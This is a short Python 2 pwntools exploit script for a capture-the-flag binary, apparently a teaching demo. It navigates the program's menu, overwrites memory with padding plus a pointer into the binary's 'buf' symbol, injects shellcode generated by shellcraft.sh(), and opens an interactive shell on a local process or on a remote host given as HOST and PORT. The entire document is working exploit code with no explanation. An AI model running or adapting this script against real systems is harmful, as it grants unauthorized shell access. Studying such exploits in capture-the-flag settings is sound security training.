#!/usr/bin/env python2

from pwn import *
#context.log_level = 0

# Setup goodies
binary = '../../games/4/ctf'
context(os = 'linux', arch = 'amd64')
elf = ELF(binary)

# Demo should work even without a HOST
if 'HOST' in args:
    r = remote(args['HOST'], int(args['PORT']))
else:
     r = process(binary)

buf_start = elf.symbols['buf']
buf_shellcode = buf_start + 2

r.recvuntil("Exit\n")

r.sendline("2")
r.sendline("A")
r.sendline("A")
r.sendline("2")
r.sendline("B")
r.sendline("B")
r.sendline("3")
r.sendline("1")
r.sendline("CCC")

r.sendline(flat(
    'A'*16,
    'B'*16,
    buf_shellcode
))

r.sendline("4")

r.sendline(flat(
    "2 ",
    asm(shellcraft.sh())
))

r.clean()
r.interactive()

